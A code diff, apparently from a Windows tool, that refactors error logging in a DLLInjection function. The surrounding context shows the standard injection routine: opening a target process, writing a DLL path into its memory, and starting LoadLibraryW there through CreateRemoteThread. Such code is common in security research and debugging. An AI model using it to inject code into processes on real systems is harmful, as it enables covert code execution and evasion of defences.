@@ -35,7 +35,7 @@ BOOL DLLInjection(
         return FALSE;
     }
 
-    INFO("trying to inject %S to the remote process...", DLL);
+    INFO("trying to inject %S to the remote process...", DLLPath);
     INFO("trying to get a handle on the process (%ld)...", PID);
     hProcess = OpenProcess(
             PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
@@ -43,7 +43,7 @@ BOOL DLLInjection(
             PID
     );
     if (NULL == hProcess) {
-        WARN("[OpenProcess] failed, error: 0x%lx", GetLastError());
+        PrettyFormat("OpenProcess", GetLastError());
         return EXIT_FAILURE;
     }
     OKAY("[0x%p] got a handle on the process!", hProcess);
@@ -51,7 +51,7 @@ BOOL DLLInjection(
     INFO("getting a handle to Kernel32...");
     hKernel32 = GetModuleHandleW(L"Kernel32.dll");
     if (NULL == hKernel32) {
-        WARN("[GetModuleHandleW] failed, error: 0x%lx", GetLastError());
+        PrettyFormat("GetModuleHandleW", GetLastError());
         STATE = FALSE; goto CLEAN_UP;
     }
     OKAY("[0x%p] got a handle to Kernel32!", hKernel32);
@@ -59,7 +59,7 @@ BOOL DLLInjection(
     INFO("getting the address of LoadLibraryW...");
     p_LoadLibrary = GetProcAddress(hKernel32, "LoadLibraryW");
     if (NULL == p_LoadLibrary) {
-        WARN("[GetProcAddress] failed, error: 0x%lx", GetLastError());
+        PrettyFormat("GetProcAddress", GetLastError());
         STATE = FALSE; goto CLEAN_UP;
     }
     OKAY("[0x%p] obtained the address of LoadLibraryW!", p_LoadLibrary);
@@ -72,7 +72,7 @@ BOOL DLLInjection(
             PAGE_READWRITE
     );
     if (NULL == rBuffer) {
-        WARN("[VirtualAllocEx] failed, error: 0x%lx", GetLastError());
+        PrettyFormat("VirtualAllocEx", GetLastError());
         STATE = FALSE; goto CLEAN_UP;
     }
     OKAY("[0x%p] [RW-] allocated %zu-byte buffer to the target process", rBuffer, PathSize);
@@ -80,11 +80,11 @@ BOOL DLLInjection(
     if (!WriteProcessMemory(
                 hProcess,
                 rBuffer,
-                DLL,
+                DLLPath,
                 PathSize,
                 &BytesWritten 
     )){
-        WARN("[WriteProcessMemory] failed, error: 0x%lx", GetLastError());
+        PrettyFormat("WriteProcessMemory", GetLastError());
         STATE = FALSE; goto CLEAN_UP;
     }
     OKAY("[0x%p] [RW-] wrote %zu-bytes to the allocated buffer", rBuffer, BytesWritten);
@@ -99,7 +99,7 @@ BOOL DLLInjection(
             &TID 
     );
     if (NULL == hThread) {
-        WARN("[CreateRemoteThreadEx] failed, error: 0x%lx", GetLastError());
+        PrettyFormat("CreateRemoteThread", GetLastError());
         STATE = FALSE; goto CLEAN_UP;
     }
     OKAY("[0x%p] successfully created a thread (%ld)!", hThread, TID);
